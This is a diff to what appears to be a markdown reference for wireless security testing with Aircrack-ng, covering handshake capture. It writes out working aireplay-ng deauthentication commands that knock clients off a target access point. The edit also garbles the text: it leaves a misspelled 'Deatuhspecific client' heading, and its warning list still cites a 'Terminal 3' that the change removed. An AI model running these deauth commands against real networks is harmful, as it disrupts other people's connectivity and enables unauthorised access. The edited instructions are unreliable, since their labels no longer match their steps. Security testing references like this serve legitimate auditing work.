@@ -175,19 +175,13 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
     sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
     ```
 
-    **Terminal 2 - Deauth attack:**
-    ```bash
-    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan1mon
-    ```
-
-    **Terminal 3 - Target specific client:**
+    **Terminal 2 - Deatuhspecific client:**
     ```bash
     sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan1mon
     ```
 
     !!! warning "Active Deauth"
         - **Terminal 1 - Capture handshake**: Starts monitoring the target network for handshakes
-        - **Terminal 2 - Deauth attack**: Sends deauthentication packets to disconnect clients
         - **Terminal 3 - Target specific client**: Focuses deauth attack on a specific device
 
 === "Fake AP Attack"
